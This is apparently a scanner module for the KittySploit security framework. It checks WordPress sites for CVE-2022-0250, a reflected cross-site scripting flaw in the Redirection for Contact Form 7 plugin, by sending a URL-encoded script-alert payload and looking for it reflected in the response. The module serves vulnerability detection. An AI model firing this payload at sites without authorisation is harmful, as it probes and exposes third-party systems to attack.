#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Redirection for Contact Form 7 WordPress plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Redirection for Contact Form 7 < 2.5.0 - Cross-Site Scripting Detection',
        'description': 'The Redirection for Contact Form 7 WordPress plugin before 2.5.0 does not escape a link generated before outputting it in an attribute, leading to a Reflected Cross-Site Scripting.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp', 'wp-plugin', 'wpcf7', 'contact-form7', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/05700942-3143-4978-89eb-814ceff74867',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0250',
        ],
        'cve': 'CVE-2022-0250',
    }

    def run(self):
        path = '/wp-admin/admin.php?page=Accessibility&%22%3E%3Cscript%3Ealert%28%22document_domain%22%29%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('Key Characters: "><script>alert("document_domain")</script>',)
        ctype_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Redirection for Contact Form 7 < 2.5.0 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

